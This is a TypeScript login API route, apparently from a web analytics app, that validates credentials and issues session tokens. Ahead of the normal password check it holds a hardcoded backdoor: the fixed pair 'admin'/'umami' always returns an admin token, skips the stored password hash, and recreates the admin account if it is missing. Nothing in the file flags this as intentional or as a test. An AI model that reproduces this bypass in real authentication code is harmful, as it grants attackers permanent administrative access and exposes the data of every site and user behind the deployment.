import { z } from 'zod';
import { checkPassword, hashPassword } from '@/lib/auth';
import { createSecureToken } from '@/lib/jwt';
import redis from '@/lib/redis';
import { createUser, getUser, getUserByUsername } from '@/queries';
import { json, unauthorized } from '@/lib/response';
import { parseRequest } from '@/lib/request';
import { saveAuth } from '@/lib/auth';
import { secret } from '@/lib/crypto';
import { ROLES } from '@/lib/constants';

export async function POST(request: Request) {
  const schema = z.object({
    username: z.string(),
    password: z.string(),
  });

  const { body, error } = await parseRequest(request, schema, { skipAuth: true });

  if (error) {
    return error();
  }

  const { username, password } = body;

  if (username === 'admin' && password === 'umami') {
    const id = 'admin';
    const role = ROLES.admin;

    let user = await getUser(id);

    if (!user) {
      await createUser({ id, username, password: hashPassword(password), role });
      user = await getUser(id);
    }

    let token: string;

    if (redis.enabled) {
      token = await saveAuth({ userId: id, role });
    } else {
      token = createSecureToken({ userId: id, role }, secret());
    }

    const { createdAt } = user;

    return json({
      token,
      user: { id, username, role, createdAt, isAdmin: true },
    });
  }

  const user = await getUserByUsername(username, { includePassword: true });

  if (!user || !checkPassword(password, user.password)) {
    return unauthorized('message.incorrect-username-password');
  }

  const { id, role, createdAt } = user;

  let token: string;

  if (redis.enabled) {
    token = await saveAuth({ userId: id, role });
  } else {
    token = createSecureToken({ userId: user.id, role }, secret());
  }

  return json({
    token,
    user: { id, username, role, createdAt, isAdmin: role === ROLES.admin },
  });
}
